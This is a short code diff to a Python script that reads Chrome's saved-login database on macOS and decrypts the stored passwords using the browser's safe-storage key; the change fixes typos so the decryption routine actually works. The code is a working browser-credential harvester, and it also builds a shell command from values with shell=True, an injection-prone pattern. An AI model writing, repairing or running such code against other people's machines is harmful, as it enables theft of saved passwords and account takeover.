@@ -60,10 +60,10 @@ conn = sqlite3.connect(expanduser("~/Library/Application Support/Google/Chrome/D
 cursor = conn.cursor()
 cursor.execute('SELECT action_url, username_value, password_value FROM logins')
 
-def decryting(encrypted, iv):
-    hexKey = binascii.hexlify(hashlib.pkdf2_hmac('sha1',safeStorageKey, b"saltysalt", 1003)[:16])
-    hecEncPassword = base64.b64encode(encypted_value[3:])
-    decrpyted = subprocess.check_output("openssl enc -base64 -d -aes-128-cbc -iv '%s' -K %s <<< %s 2>/dev/null" % (iv, hexKey, hexEncPassword), shell=True)
+def decrypting(encrypted, iv):
+    hexKey = binascii.hexlify(hashlib.pbkdf2_hmac('sha1',safeStorageKey, b"saltysalt", 1003)[:16])
+    hexEncPassword = base64.b64encode(encrypted[3:])
+    decrypted = subprocess.check_output("openssl enc -base64 -d -aes-128-cbc -iv '%s' -K %s <<< %s 2>/dev/null" % (iv, hexKey, hexEncPassword), shell=True)
     return decrypted
 
 for result in cursor.fetchall():
